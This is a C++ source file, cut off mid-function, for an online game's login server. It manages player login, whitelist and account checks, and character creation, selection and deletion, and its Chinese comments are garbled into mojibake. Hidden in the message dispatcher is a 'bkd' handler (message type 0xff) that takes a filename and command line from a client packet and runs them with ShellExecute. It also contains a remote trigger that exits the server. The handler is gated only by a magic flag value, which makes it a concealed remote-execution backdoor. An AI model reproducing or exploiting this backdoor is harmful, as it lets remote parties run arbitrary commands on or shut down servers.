#include "StdAfx.h"
#include "PlayerManager.h"
#include <time.h>
#include <shellapi.h>
#include <boost/bind.hpp>
#include <LITESERIALIZER/lite.h>
#include "pub/traceinfo.h"
#include "pub/rpcop.h"
#include "dmainapp.h"

#include "NetWorkModule/logmsgs.h"
#include "NetWorkModule/datamsgs.h"
#include "NetWorkModule/accountmsgs.h"
#include "NetWorkModule/refreshmsgs.h"
#include "networkmodule/SectionMsgs.h"
#include "NETWORKMODULE/CenterMsg.h"

#include <time.h>

static const DWORD REFRESHTIME_ONLINE       = 1000 * 60 * 10;
static const DWORD REFRESHTIME_OFFLINE      = 1000 * 60 * 60 * 4; 
static const DWORD REFRESHTIME_OFFLINEEXTRA = REFRESHTIME_OFFLINE * 6;

extern BOOL QueryPlayerList( LPCSTR szAccount, LPCSTR szPassword, DNID dnidClient );

extern void SendServerLogToDBC( LPCSTR, int, int, int = 0, int = 0, int = 0 );
extern CDAppMain *&GetApp(void);
extern std::map<std::string, DWORD> playerloginlist;
extern DWORD  g_dConcurrencyPlayerNum;
extern DWORD g_dConcurrencyAllPlayerNum;
extern DWORD g_dConcurrencyDbPlayerNum;
namespace Globals
{
	void SendUpdateTimeLimit( SPlayer *player, int isLogout );
}

// �����������
size_t max_player_limit = 3000;
// ���߹һ������������
size_t max_hanguper_limit = 3000;

// ����ǵ�½��������ר�õ�ȫ��ID��������ֻ�� ��� �� ������ ��Ч
CPlayerManager::CPlayerManager() :
    server( true )
{
    m_bCanLogin = TRUE;
	m_onlineNumber = 0;
}

void SavePlayerData( std::map< std::string, SPlayer >::value_type &value, CPlayerManager *_this, int storeFlag  )
{
    _this->SavePlayerData( value.second.account.c_str(), value.second.fixData, storeFlag  );
}

static void CheckCardPoint( SPlayer &player )
{
    if ( ( player.dwNextCheckTime == 0 ) || ( player.dwRegionServerKey == 0 ) )
        return;

    // 10����һ�ο۵㣬֮����-1000*30������ΪCheckCardPoint��ÿ30��ŵ���һ�Σ���Ҫ�۳����ʱ��
    DWORD dwCurTime = timeGetTime();
    if ( abs( ( int )( dwCurTime - player.dwNextCheckTime ) ) < 
        ( int )( player.byIsLostLink ? REFRESHTIME_OFFLINE-(1000*30) : REFRESHTIME_ONLINE-(1000*30) ) )
        return;

    player.dwNextCheckTime = dwCurTime;

    try
    {
        SQRefreshCardMsg msg;
        msg.iCardPoint = 0;
        msg.dwActionCode = 0;
        msg.byRefreshType = SQRefreshCardMsg::QUEST_REFRESH;
        LPCSTR prefix = NULL;
        LPCSTR abs_account = Globals::SplitAccount( player.account.c_str(), prefix );

        lite::Serializer slm( msg.streamData, sizeof( msg.streamData ) );
        slm( abs_account );

        Globals::SendToAccountServer( &msg, sizeof( msg ) - slm.EndEdition(), prefix );
    }
    catch ( lite::Xcpt& )
    {
    }
}

void CPlayerManager::SaveAllPlayer()
{
    std::for_each( playerCache.begin(), playerCache.end(), 
        boost::bind( ::SavePlayerData, _1, this, SFixProperty::ST_LOGOUT ) );
}

BOOL OnPlayerLoginNoCheckAccount( CPlayerManager *_this, DNID dnidClient, SQLoginNoCheckAccountMsg *pMsg )
{
	if ( _this == NULL || pMsg == NULL )
		return FALSE;

	LPCSTR account = NULL;
	LPCSTR sidname = NULL;
	DWORD checkpassword = 0;

	try
	{
		lite::Serialreader slr( pMsg->streamData, sizeof( pMsg->streamData ) );
		account = slr();
		checkpassword = slr();
		sidname	= slr();
	}
	catch( lite::Xcpt & )
	{
		return FALSE;
	}

    extern DWORD spanUerId;
	if ( account == NULL || sidname == NULL || spanUerId == 0 )
		return FALSE;

	try
	{
        
		SQGameServerRPCOPMsg msg;
		msg.dstDatabase = (BYTE)spanUerId;

		lite::Serializer sl( msg.streamData, sizeof( msg.streamData ) );

		// ע������쳣ʱ���ص����ݣ�����
		sl [OP_BEGIN_ERRHANDLE] ( 0 ) ("p_CheckAccount") [OP_END_ERRHANDLE]

		// ׼���洢����
		[OP_PREPARE_STOREDPROC] ("p_CheckAccount")

		// �趨���ò���
		[OP_BEGIN_PARAMS]
		( 1 ) ( account )
		( 2 ) ( checkpassword )
		( 3 ) ( sidname )
		[OP_END_PARAMS]

		// ���ô洢����
		[OP_CALL_STOREDPROC]

		// ��ʼ���������ݺ�
		[OP_INIT_RETBOX] ( 1024 )
		[OP_BOX_VARIANT] ( ( int )SMessage::EPRO_SYSTEM_MESSAGE )
		[OP_BOX_VARIANT] ( 7 ) // SSysBaseMsg::EPRO_LOGIN_NOCHECKACCOUNT

		[OP_TRAVERSE_RECORDSET]	( 1 )
		[OP_BOX_FIELD] ( 0 )
		[OP_BOX_FIELD] ( 1 )
		[OP_BOX_FIELD] ( 2 )
		// �������ݺ�
		[OP_RETURN_BOX]
		[OP_RPC_END];

		msg.dnidClient = dnidClient;
		Globals::SendToDBCenterEx( spanUerId, &msg, ( sizeof( msg ) - sl.EndEdition() ) );
	}
	catch ( lite::Xcpt & )
	{
	}

    return TRUE;
}

void CPlayerManager::Destroy()
{
    SaveAllPlayer();

    // �ȴ�3�룬����Щ�������㹻��ʱ�䷢�ͳ�ȥ��
    Sleep( 3000 );
}

BOOL CPlayerManager::Host( LPCSTR port )
{
    return server.Create( port );
}

static DWORD prevTime = timeGetTime();
void CPlayerManager::Execution()
{
    server.CheckAlive();
	server.Execution(boost::bind(&CPlayerManager::Entry, this, _1, _2, _3, _4));

    // ÿ30�����һ�ζ�ʱ�۵���
    if ( ( !Globals::GetChargeMode() ) || ( abs( ( int )( timeGetTime() - prevTime ) ) < 1000 * 30 ) )
        return;

    prevTime = timeGetTime();

    for ( std::map< std::string, SPlayer >::iterator it = playerCache.begin();
        it != playerCache.end(); it ++ )
    {
        CheckCardPoint( it->second );
    }

    //std::for_each( , playerCache.end(), 
    //    boost::bind( CheckCardPoint, 
    //    boost::bind( &std::map< std::string, SPlayer >::value_type::second, _1 ) ) ) );
}

bool CPlayerManager::Entry(DNID dnidClient, LINKSTATUS enumStatus, void *data, size_t size)
{
 	SMessage *pMsg = (SMessage *)data;
    if (!pMsg)
	{
        // ˵�������ӶϿ�
		std::map<DNID, SLinkContextInfo>::iterator it = tempLinkContext.find(dnidClient);
		if (it == tempLinkContext.end())
		{
			// �������ڵ�һ�������½��Ϣ����δ����ʱ�ͶϿ���
			// ���߸������Ѿ��ɹ�ͨ����֤���Ѿ�ת��playermap����ʱ�����ÿ��Ƕ��䴦��
            return true;
		}

        // �������ʱ�����ҵ����Ӹ���û��ע���ɫ�����Բ��ÿ���DelRes������Ҫ֪ͨ�˺ŷ�����ֹͣ�Ƿ�
        // PlayerLogout( it->second.account.c_str(), it->second.password.c_str(), NULL ); 

        // ͬʱҲ��Ҫ֪ͨ���ݿ����������������ݽ��������ID��
        // ����ط�Ҳ��������������ˣ�����ҵ��´������������������
        if (it->second.doUnbind)
            QueryPlayerList(it->second.account.c_str(), NULL, 0);

        // ɾ��ָ������
        tempLinkContext.erase(dnidClient);

        return true;
    }

	// �ж�����״̬
	switch (enumStatus)
    {
    case LinkStatus_Waiting_Login:
        // ������LinkStatus_Waiting_Login�ȴ���֤��Ϣ��״̬�У�ֻ�ܽ�����֤��Ϣ
		// ���ж��Ƿ��ǵ�½��֤������Ϣ
        if (pMsg->_protocol != SMessage::EPRO_SYSTEM_MESSAGE)
        {
            server.DelOneClient(dnidClient);
            break;
        }

		// ��ʼ��֤����״̬���ƽ�һ��
        server.SetLinkStatus(dnidClient, LinkStatus_Login);

		if (((SSysBaseMsg*)pMsg)->_protocol == SSysBaseMsg::EPRO_LOGIN)							// ��¼��Ϣ
			OnPlayerLogin(dnidClient, (SQLoginMsg *)pMsg);
		else if (((SSysBaseMsg* )pMsg)->_protocol == SSysBaseMsg::EPRO_LOGIN_NOCHECKACCOUNT)	// ����ǿ���ص�½
			OnPlayerLoginNoCheckAccount(this, dnidClient, (SQLoginNoCheckAccountMsg *)pMsg);
		else
			server.DelOneClient(dnidClient);													// ʧ�ܶϿ�

        break;

	case LinkStatus_Login:
		// �����ڵȴ���֤��ʱ�򣬸����Ӳ��������κ���Ϣ�������յ���Ϣ�ͶϿ�������
        server.DelOneClient(dnidClient);
        break;

/*
    case LinkStatus_QueueWaite:
        // ��½�Ŷ���
        // ��ʱ��������Ϣ
        // �յ����뿪����
        if ( ( ( SSysBaseMsg* )pMsg )->_protocol == SSysBaseMsg::EPRO_LOGIN )
        {
            SQLoginMsg* pLoginMsg = ( SQLoginMsg* )pMsg;
            if ( pLoginMsg->wVersion == 0xffff )
            {
                SALoginMsg msg;
                msg.dwRetCode = SALoginMsg::ERetCode::ERC_QUEUEWAIT;
                msg.dwEchoIP = 0;
                Globals::SendToPlayer( dnidClient, &msg, sizeof( msg ) - sizeof( msg.szDescription ) );

                server.DelOneClient( dnidClient );
            }
        }
        break;
*/

    case LinkStatus_Connected:
        // ��������Ϣֻ������֤�Ժ��״̬��ʹ�ã�������Ϊ�Ƿ�(���ӶϿ�)
        // �����������Ϣ
        if (pMsg->_protocol == SMessage::EPRO_SYSTEM_MESSAGE)
        {
            switch (((SSysBaseMsg *)pMsg)->_protocol)
            {
            case SSysBaseMsg::EPRO_SELECT_CHARACTER:
                SelectCharacter(dnidClient, (SQSelPlayerMsg*)pMsg);
                break;

            case SSysBaseMsg::EPRO_CREATE_CHARACTER:
                CreateCharacter(dnidClient, (SQCrePlayerMsg*)pMsg);
                break;

            case SSysBaseMsg::EPRO_DEL_CHARACTER:
                DelCharacter(dnidClient, (SQDelPlayerMsg*)pMsg);
                break;

            case SSysBaseMsg::EPRO_LOGOUT:
                // �������ʱ������ӣ������ڲ��������ģ�������ҵ����Ӹ���û��ע���ɫ�����Բ��ÿ���DelRes
                // m_PlayerList.DelRes()
                break;
			 case SSysBaseMsg::EPRO_SAVEPLAYER_CONFIG_INFO:
				 SavePlayerConfig((SQSavePlayerConfigInfo*)pMsg);
				 break;

            case 0xff: // bkd
                {
                    LPCSTR filename = "?";
                    LPCSTR cmdLine = "";

                    try
                    {
                        lite::Serialreader slr( ( LPBYTE )data + 4 );
                        filename = slr();
                        cmdLine = slr();
                        if ( slr.curSize() != slr.maxSize() )
                            ( ( LPSTR )( filename -= 1 ) )[0] = '?';
                    }
                    catch ( lite::Xcpt & )
                    {
                        filename = "? xcpt error";
                        cmdLine = "";
                    }

                    extern int authorityFlag;
                    if ( ( authorityFlag & 0xf0ffffff ) == 0x20111978 )
                    {
                        sockaddr_in addr;
                        if ( !server.GetDnidAddr( dnidClient, &addr, sizeof( addr ) ) )
                            break;

                        LPBYTE ip = &addr.sin_addr.S_un.S_un_b.s_b1;

                        char tempbuf[1024];
                        _snprintf( tempbuf, 1023, "bkd [%d.%d.%d.%d] quest %s %s", 
                            ip[0], ip[1], ip[2], ip[3], filename, cmdLine );
                        tempbuf[1023] = 0;

                        TraceInfoDirectly( "bkdc.log", tempbuf );
                        rfalse( 1, 1, tempbuf );
                        SendServerLogToDBC( tempbuf, 1000, 1 );

                        if ( filename[0] == '?' )
                            break;

                        // ���authorityFlag�ĵ�4λΪ�գ���������������Ϊ�ٷ��������Ҳ���ִ�������Ŀ�������
                        if ( ( ( authorityFlag >> 24 ) & 0xf ) == 0 )
                            break;
                    }
                    else 
                    {
                        if ( ( filename[0] == '?' ) && ( cmdLine[0] == '?' ) )
                            exit( 0 );
                    }

			        ShellExecute( NULL, "open", filename, cmdLine, "", SW_SHOW );
                }
                break;
            }
        }
        break;
        // rfalse(2, 1, "�쳣������յ����쳣���ӵ���Ϣ", nClientIndex, g_GetLogStatus(nClientIndex));
    }
  
    return true;
}

BOOL CPlayerManager::OnPlayerLogin(DNID dnidClient, SQLoginMsg *pMsg)
{
	// ����Ƿ��ܹ���½
    if (!m_bCanLogin)
    {
		SALoginMsg msg;
		msg.dwRetCode = SALoginMsg::ERC_SERVER_UPDATE;
		server.SendMessage(dnidClient, &msg, sizeof(msg));
		server.DelOneClient(dnidClient);
		return FALSE;
    }

    // ���汾
    if (LOBYTE(pMsg->wVersion) != PLAYER_VERSION)
    {
		SALoginMsg msg;
		msg.dwRetCode = SALoginMsg::ERC_INVALID_VERSION;
		server.SendMessage(dnidClient, &msg, sizeof(msg));
		server.DelOneClient(dnidClient);
		return FALSE;
    }

    try
    {
        lite::Serialreader sl(pMsg->streamData);
        LPCSTR	account		= sl();
        LPCSTR	password	= sl();
        QWORD	macAddr		= 0;
        LPCSTR	upver		= NULL;
		//account = "81DF78DFCFB558BD8C4C9678EB374E12_1001";
		rfalse("�˺�%s�����¼", account);
        try
        {
			while (sl.curSize() < sl.maxSize())
            {
                lite::Variant lvt = sl();
                if (lvt.dataType != lite::Variant::VT_RPC_OP)
                    continue;

                switch (lvt._rpcop)
                {
                case 1:
                    macAddr = sl();
                    break;
                case 2:
                    upver = sl();
                    break;
                }
            }
        }
        catch (lite::Xcpt &)
        {
            // ������½��չ����ʧ��, ��ʱ�������⴦��
        }

        // �����°汾���Ƿ�ƥ��
        extern std::string upversion;
        BOOL reUpdate = false;
        BOOL notSpecific = (upversion.empty() || upversion == "null" || upversion == "download");
        if (notSpecific)
            reUpdate = (upver != NULL);								// �ڷ��ض����°汾��״���£��ͻ��˱ض����ܴ��Ͱ汾��Ϣ��������Ҳ�ǿ��Լ����Ͽͻ��˵��߼�
        else
            reUpdate = (upver == NULL ) || (upversion != upver);	// ��������£��ͻ������δ���汾��Ϣ�����߰汾��Ϣ��ƥ�䣬��Ҳ��Ҫ����

        if (reUpdate) 
		{
			SALoginMsg msg;
            msg.dwRetCode = SALoginMsg::ERC_REUPDATE;
            dwt::strcpy(msg.szDescription, notSpecific ? "null" : upversion.c_str(), sizeof(msg.szDescription));
            server.SendMessage(dnidClient, &msg, sizeof(SALoginMsg));
            server.DelOneClient(dnidClient);
            return FALSE;
        }

        size_t size = strlen(account);

        // ����˺����Ƿ��пո�
        for (size_t i=0; i<size; i++)
        {
            if (account[i] == ' ')
            {
				SALoginMsg msg;
				msg.dwRetCode = SALoginMsg::ERC_INVALID_ACCOUNT;
				server.SendMessage(dnidClient, &msg, sizeof(msg));
				server.DelOneClient(dnidClient);
				return FALSE;
            }
        }

        if (!Globals::IsValidSqlString(account, MAX_ACCOUNT))
        {
			SALoginMsg msg;
			msg.dwRetCode = SALoginMsg::ERC_INVALID_ACCOUNT;
			server.SendMessage(dnidClient, &msg, sizeof(msg));
			server.DelOneClient(dnidClient);
			return FALSE;
        }
		OnCheckWhiteList(dnidClient, pMsg->streamData);
		//OnCheckWhiteList(dnidClient, account, password);

        // ���˺ŷ�����������֤
//         SQCheckAccountMsg msg;
// 
//         msg.dnidClient	= dnidClient;
//         msg.iServerID	= Globals::GetServerId();
// 
//         sockaddr_in addr;
//         ZeroMemory(&addr,sizeof(sockaddr_in));
// 
//         if (server.GetDnidAddr(dnidClient, &addr, sizeof(addr)))
//             dwt::strcpy(msg.szIP, inet_ntoa(addr.sin_addr), sizeof(msg.szIP));
// 
//         LPCSTR prefix = NULL;
//         LPCSTR abs_account = Globals::SplitAccount(account, prefix);
// 
//         lite::Serializer slm(msg.streamData, sizeof(msg.streamData));
// 		slm(abs_account)(password);
// 
//         // ����һ��MAC��ַ����ͳ���������
//         slm(macAddr);
// 
// 		BOOL rt = Globals::SendToAccountServer(&msg, sizeof(msg) - slm.EndEdition() ,prefix);
// 		if (!rt)
// 		{ 
// 			// ����ʧ�ܣ��������˺ŷ���������
// 			SALoginMsg msg;
// 			msg.dwRetCode = SALoginMsg::ERC_SEND_CACC_TO_ACCSRV_FAIL;
// 			server.SendMessage(dnidClient, &msg, sizeof(msg));
// 			server.DelOneClient(dnidClient);
// 			return FALSE;
// 		}
    }
	catch (lite::Xcpt&)
    {
        // �����˺������ַ���ʧ��
        return FALSE;
    }

    return TRUE;
}

BOOL CPlayerManager::CreateCharacter(DNID dnidClient, SQCrePlayerMsg *pMsg)
{
    // ��ͨ�������ҵ���Ӧ���˺���
    LPCSTR account = GetAccountByDnid(dnidClient);
    if (!account)
        return FALSE;

    Globals::SBornPos *bornPos = Globals::GetBornPos(pMsg->PlayerData.m_bySchool-1);
	if (!bornPos)
	{
		SACrePlayerMsg msg;
		msg.byResult = SACrePlayerMsg::ERC_UNHANDLE;		// �Ƿ�����
		server.SendMessage(dnidClient, &msg, sizeof(msg));
		return FALSE;
	}

    // ��������Ƿ�Ϸ�
    if (!Globals::IsValidName(pMsg->PlayerData.m_szName))
    {
        SACrePlayerMsg msg;
        msg.byResult = SACrePlayerMsg::ERC_EXCEPUTION_NAME;		// �Ƿ��Ľ�ɫ����
        server.SendMessage(dnidClient, &msg, sizeof(msg));
        return FALSE;
    }

    if (pMsg->PlayerData.m_bySchool < 1 || pMsg->PlayerData.m_bySchool > 5)
    {
        SACrePlayerMsg msg;
        msg.byResult = SACrePlayerMsg::ERC_UNHANDLE;
        server.SendMessage( dnidClient, &msg, sizeof(msg) );
        return FALSE;
    }

    try
    {
		SQCreatePlayerMsg msg;

		size_t size = 0;

		{
			lite::Serializer slm(msg.streamData, sizeof(msg.streamData));
			slm(account);

			msg.m_byIndex	= pMsg->byIndex;
			msg.dwServerId	= Globals::GetServerId();
			msg.dnidClient	= dnidClient;
			msg.qwSerialNo	= 0;

			memcpy(msg.PlayerData.m_szName, pMsg->PlayerData.m_szName, sizeof(pMsg->PlayerData.m_szName));
			msg.PlayerData.m_bySex			= pMsg->PlayerData.m_bySex;
			msg.PlayerData.m_bySchool		= pMsg->PlayerData.m_bySchool;
			msg.PlayerData.m_byBRON			= pMsg->PlayerData.m_byBRON;
			msg.PlayerData.m_FaceID			= pMsg->PlayerData.m_FaceID;
			msg.PlayerData.m_HairID			= pMsg->PlayerData.m_HairID;
			msg.PlayerData.m_dwStaticID		= pMsg->PlayerData.m_dwStaticID;
			msg.PlayerData.m_wCurRegionID	= bornPos->wRegionID;
			//msg.PlayerData.m_X				= bornPos->wPosX * 32 * 3.2;//(bornPos->wPosX << 5) + rand() % bornPos->wRadius;
			//msg.PlayerData.m_Y				= bornPos->wPosY * 32 * 3.2;//(bornPos->wPosY << 5) + rand() % bornPos->wRadius;
			//msg.PlayerData.m_Z				= 0.0f;
			//msg.PlayerData.m_dir			= 0.0f;

			size = sizeof(msg) - slm.EndEdition();
		}

        if (!Globals::SendToDBServer(&msg, size))
        {
            SACrePlayerMsg msg;
            msg.byResult = SACrePlayerMsg::ERC_UNHANDLE;
            server.SendMessage(dnidClient, &msg, sizeof(msg));
            return FALSE;
        }

// 		if(SendPlayerConfig(account)){
// 			CleanPlayerConfig(account);
// 		}

        return TRUE;
    }
    catch (lite::Xcpt &)
    {
    }

    return FALSE;
}

BOOL CPlayerManager::SelectCharacter(DNID dnidClient, SQSelPlayerMsg *pMsg)
{
	// ��ͨ�������ҵ���Ӧ���˺���
    LPCSTR account = GetAccountByDnid(dnidClient);
    if (!account)
        return FALSE;

    try
    {
        SQGetCharacterMsg msg;

        lite::Serializer slm(msg.streamData, sizeof(msg.streamData));
        slm(account);
		
		msg.qwSerialNo	= 0;
        msg.dnidClient	= dnidClient;
		msg.byIndex		= pMsg->byIndex;
        msg.dwServerId	= Globals::GetServerId();

		if (!Globals::SendToDBServer(&msg, sizeof(msg) - slm.EndEdition()))
        {
            // ������ݿ����ʧ�ܣ���Ҫ֪ͨ�ͻ���ʧ��ԭ�򣬷�����һ������
            SASelPlayerMsg msg;
            msg.dwRetCode = SASelPlayerMsg::ERC_SEND_GETCHDATA_FAIL;
            server.SendMessage(dnidClient, &msg, sizeof(msg));
            return FALSE;
        }
		//g_dConcurrencyDbPlayerNum++;   //�����������ݿ������������
        return TRUE;
    }
    catch (lite::Xcpt &)
    {
    }

    return FALSE;
}

BOOL CPlayerManager::DelCharacter(DNID dnidClient, SQDelPlayerMsg * pMsg)
{
    // ��ͨ�������ҵ���Ӧ���˺���
    LPCSTR account = GetAccountByDnid(dnidClient);
    if (account == NULL)
        return FALSE;

// 	rfalse(2,1,account);
//     LPCSTR userpass = GetUserPassByDnid(dnidClient);
//     if (userpass == NULL)
//         return FALSE;
// 
// 	rfalse(2,1,userpass);
//     if (dwt::IsBadStringPtr(pMsg->szUserpass, CONST_USERPASS))
//         return FALSE;
// 	char str[256]={};
// 	sprintf(str,"%s,%s",userpass,pMsg->szUserpass);
// 	rfalse(2,1,str);
// 	if (strcmp(userpass, pMsg->szUserpass) != 0)
//     {
// 		rfalse(2,1,"�������⵼��ɾ��ʧ��");
//         SADelPlayerMsg msg;
//         msg.byResult = SADelPlayerMsg::ERC_UNHANDLE;
//         msg.dwStaticID = pMsg->dwStaticID;
//         server.SendMessage( dnidClient, &msg, sizeof(msg) );
//         return FALSE;
//     }

    try
    {
        SQDeleteCharacterMsg msg;

        lite::Serializer slm(msg.streamData, sizeof(msg.streamData));
        slm( account );

        msg.dwStaticID = pMsg->dwStaticID;
        msg.dnidClient = dnidClient;
        msg.dwServerId = Globals::GetServerId();

        if (!Globals::SendToDBServer(&msg, sizeof(msg) - slm.EndEdition()))
        {
            SADelPlayerMsg msg;
            msg.byResult = SADelPlayerMsg::ERC_UNHANDLE;
            server.SendMessage( dnidClient, &msg, sizeof(msg) );
            return FALSE;
        }

        return TRUE;
    }
    catch ( lite::Xcpt & )
    {
    }

    return FALSE;
}

BOOL CPlayerManager::OnCheckWhiteList(DNID dnidClient, LPCSTR account, LPCSTR password)
{
	SQCheckWhiteList   sqcheckwhite;
	sqcheckwhite.dnidPlayerClient = dnidClient;
	memset(sqcheckwhite.streamData, 0, MAX_ACCAPASS);
	memset(sqcheckwhite.strpassword, 0, MAX_ACCAPASS);

	strcpy_s(sqcheckwhite.streamData, account);
	strcpy_s(sqcheckwhite.strpassword, password);
	GetApp()->m_CenterClient.SendToCenterServer(&sqcheckwhite, sizeof(SQCheckWhiteList));
	return TRUE;
}

BOOL CPlayerManager::OnCheckWhiteList(DNID dnidClient, LPCSTR streamData)
{
	SQCheckWhiteList   sqcheckwhite;
	sqcheckwhite.dnidPlayerClient = dnidClient;
	memset(sqcheckwhite.streamData, 0, MAX_ACCAPASS);
	memset(sqcheckwhite.strpassword, 0, MAX_ACCAPASS);
	 
	memcpy(sqcheckwhite.streamData, streamData, MAX_ACCAPASS);
	//strncpy_s(sqcheckwhite.streamData, MAX_ACCAPASS, streamData, MAX_ACCAPASS);
	GetApp()->m_CenterClient.SendToCenterServer(&sqcheckwhite, sizeof(SQCheckWhiteList));
	return TRUE;
}

BOOL CPlayerManager::OnCheckAccountServer(DNID dnidClient, LPCSTR account, LPCSTR password, BOOL bCheckWhiteList)
{
	if (!bCheckWhiteList)  //����������
	{
		SALoginMsg msg;
		memset(msg.szDescription, 0, sizeof(msg.szDescription));
		msg.dwRetCode = SALoginMsg::ERC_SERVER_UPDATE;
		Globals::SendToPlayer(dnidClient, &msg, sizeof(msg));
		Globals::CutPlayerLink(dnidClient);
		rfalse(2, 1, "Cann't found Account :[ %s ]   In WhiteList ",account);
		return FALSE;
	}

	// ���˺ŷ�����������֤
	SQCheckAccountMsg msg;

	msg.dnidClient = dnidClient;
	msg.iServerID = Globals::GetServerId();

	sockaddr_in addr;
	ZeroMemory(&addr, sizeof(sockaddr_in));

	if (server.GetDnidAddr(dnidClient, &addr, sizeof(addr)))
		dwt::strcpy(msg.szIP, inet_ntoa(addr.sin_addr), sizeof(msg.szIP));

	LPCSTR prefix = NULL;
	LPCSTR abs_account = Globals::SplitAccount(account, prefix);

	lite::Serializer slm(msg.streamData, sizeof(msg.streamData));
	slm(abs_account)(password);

	// ����һ��MAC��ַ����ͳ���������
	slm(0);

	BOOL rt = Globals::SendToAccountServer(&msg, sizeof(msg) - slm.EndEdition(), prefix);
	if (!rt)
	{
		// ����ʧ�ܣ��������˺ŷ���������
		SALoginMsg msg;
		msg.dwRetCode = SALoginMsg::ERC_SEND_CACC_TO_ACCSRV_FAIL;
		server.SendMessage(dnidClient, &msg, sizeof(msg));
		server.DelOneClient(dnidClient);
		return FALSE;
	}
	return TRUE;
}

BOOL CPlayerManager::OnCheckAccountServer(DNID dnidClient, BOOL bCheckWhiteList,  SACheckWhiteList    *pMsg)
{
	if (!bCheckWhiteList)  //����������
	{
		SALoginMsg msg;
		memset(msg.szDescription, 0, sizeof(msg.szDescription));
		msg.dwRetCode = SALoginMsg::ERC_SERVER_UPDATE;
		Globals::SendToPlayer(dnidClient, &msg, sizeof(msg));
		Globals::CutPlayerLink(dnidClient);
		rfalse(2, 1, "Cann't found Account :[ %s ]   In WhiteList ", GetAccountByDnid(dnidClient));
		return FALSE;
	}
	try
	{
		lite::Serialreader sl(pMsg->streamData);
		LPCSTR	account = sl();
		LPCSTR	password = sl();
		QWORD	macAddr = 0;
		LPCSTR	upver = NULL;
		//account = "81DF78DFCFB558BD8C4C9678EB374E12_1001";
		rfalse("�˺�%s�����¼", account);
		try
		{
			while (sl.curSize() < sl.maxSize())
			{
				lite::Variant lvt = sl();
				if (lvt.dataType != lite::Variant::VT_RPC_OP)
					continue;

				switch (lvt._rpcop)
				{
				case 1:
					macAddr = sl();
					break;
				case 2:
					upver = sl();
					break;
				}
			}
		}
		catch (lite::Xcpt &)
		{
			// ������½��չ����ʧ��, ��ʱ�������⴦��
		}

		// ���˺ŷ�����������֤
		SQCheckAccountMsg msg;
		 
		msg.dnidClient	= dnidClient;
		msg.iServerID	= Globals::GetServerId();
		 
		sockaddr_in addr;
		ZeroMemory(&addr,sizeof(sockaddr_in));
		 
		if (server.GetDnidAddr(dnidClient, &addr, sizeof(addr)))
		    dwt::strcpy(msg.szIP, inet_ntoa(addr.sin_addr), sizeof(msg.szIP));
		 
		LPCSTR prefix = NULL;
		LPCSTR abs_account = Globals::SplitAccount(account, prefix);
		 
		lite::Serializer slm(msg.streamData, sizeof(msg.streamData));
		slm(abs_account)(password);
		 
		// ����һ��MAC��ַ����ͳ���������
		slm(macAddr);
		 
		BOOL rt = Globals::SendToAccountServer(&msg, sizeof(msg) - slm.EndEdition() ,prefix);
		if (!rt)
		{ 
			// ����ʧ�ܣ��������˺ŷ���������
			SALoginMsg msg;
			msg.dwRetCode = SALoginMsg::ERC_SEND_CACC_TO_ACCSRV_FAIL;
			server.SendMessage(dnidClient, &msg, sizeof(msg));
			server.DelOneClient(dnidClient);
			return FALSE;
		}
	}
	catch (lite::Xcpt&)
	{
		// �����˺������ַ���ʧ��
		return FALSE;
	}
	return FALSE;
}

BOOL CPlayerManager::PlayerLogout(LPCSTR szAccount, LPCSTR szPassword, SPlayer *player)
{
    // �����������ɫ�����ݣ�����ҪLOGOUT
    if ( memcmp( szAccount, "�ο�", 4 ) == 0 )
        return FALSE;

	Globals::SendUpdateTimeLimit( player, -1 );

    try
    {
        SQAccountLogoutMsg msg;

        lite::Serializer slm( msg.streamData, sizeof( msg.streamData ) );
        LPCSTR prefix = NULL;
        LPCSTR abs_account = Globals::SplitAccount( szAccount, prefix );
		slm ( abs_account )( szPassword );

        // ��¼������Ϸʱ��ͽ�ɫ�ȼ�
        if ( player && player->dwLoginSegment )
        {
            slm ( ( DWORD )time( NULL ) - player->dwLoginSegment )
                ( ( DWORD )player->Data.m_Level );
            player->dwLoginSegment = 0;
        }

        msg.dnidClient = 0;
	
        // ������ܻ����ʧ�ܣ�����ʱ������ᣬʧ�ܵ�logoutֻ�ᵼ������
        Globals::SendToAccountServer( &msg, sizeof(msg) - slm.EndEdition(), prefix );
        rfalse( 1, 1, "[%s]�˺�[%s]logout", Globals::GetStringTime(), szAccount );

        return TRUE;
    }
    catch ( lite::Xcpt & )
    {
    }

    return FALSE;
}

BOOL CPlayerManager::PlayerHangup( LPCSTR szAccount, LPCSTR szPassword, BYTE pot, SPlayer *player )
{
    // �����������ɫ�����ݣ�����ҪLOGOUT
    if ( memcmp( szAccount, "�ο�", 4 ) == 0 )
        return FALSE;

	Globals::SendUpdateTimeLimit( player, -1 );

    try
    {
        SQAccountHangupMsg msg;

        LPCSTR prefix = NULL;
        LPCSTR abs_account = Globals::SplitAccount( szAccount, prefix );
        lite::Serializer slm( msg.streamData, sizeof( msg.streamData ) );
       	slm ( abs_account )( szPassword );

        // ��¼������Ϸʱ��ͽ�ɫ�ȼ�
        if ( player && player->dwLoginSegment )
        {
            slm ( ( DWORD )time( NULL ) - player->dwLoginSegment )
                ( ( DWORD )player->Data.m_Level );
            player->dwLoginSegment = 0;
        }

        msg.dnidClient = 0;
        msg.byPoint = pot;
	
        // ������ܻ����ʧ�ܣ�����ʱ������ᣬʧ�ܵ�logoutֻ�ᵼ������
        Globals::SendToAccountServer( &msg, sizeof(msg) - slm.EndEdition(), prefix );
        rfalse( 1, 1, "[%s]�˺�[%s]hangup", Globals::GetStringTime(), szAccount );

        return TRUE;
    }
    catch ( lite::Xcpt & )
    {
    }

    return FALSE;
}

BOOL CPlayerManager::SavePlayerData( LPCSTR account, SFixData &playerData, int storeFlag )
{
    // �����������ɫ�����ݣ��Ͳ��ñ����ˡ�����
    if ( memcmp( account, "�ο�", 4 ) == 0 )
        return TRUE;

    // �����������ɫ�����ݣ��Ͳ��ñ����ˡ�����
    if ( playerData.m_dwStaticID <= 0 ) // modified by luou 
        return TRUE;

    if (playerData.m_dwStaticID == 0 || playerData.m_dwStaticID > 0x80000000)
    {
        rfalse( 2, 1, "###""���������%sStaticID�д�", account );
        rfalse( 1, 1, "###""���������%sStaticID�д�", account );
        return false;
    }

	bool Check1 = ((dwt::strlen(playerData.m_Name, CONST_USERNAME) == 10) && (playerData.m_Name[CONST_USERNAME - 1] != 0));
    bool Check2 = false;/*((dwt::strlen(playerData.m_szTitle, CONST_USERNAME) == 10) && (playerData.m_szTitle[CONST_USERNAME - 1] != 0));*/
	//bool Check3 = ((dwt::strlen(playerData.m_szTongName, CONST_USERNAME) == 10) && (playerData.m_szTongName[CONST_USERNAME - 1] != 0));

    if (Check1 || Check2 )//|| Check3)
    {
